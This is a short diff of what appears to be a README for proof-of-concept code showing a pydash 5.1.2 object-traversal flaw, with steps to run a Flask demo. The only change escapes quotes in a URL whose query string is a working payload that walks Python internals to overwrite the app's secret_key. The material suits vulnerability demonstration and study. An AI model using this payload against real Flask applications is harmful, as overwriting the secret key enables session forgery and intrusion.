@@ -12,5 +12,5 @@
     1. python3 pydash_poc_5.1.2.py
 * run flask proof of concept
     1. flask --debug --app flask_poc.py run
-    2. open browser and enter following url: http://127.0.0.1:5000/?path=__class__.__init__.__globals__.app.secret_key&val='1337'
+    2. open browser and enter following url: http://127.0.0.1:5000/?path=__class__.__init__.__globals__.app.secret_key&val=\'1337\'
     3. result will be printed in the terminal window running the flask server
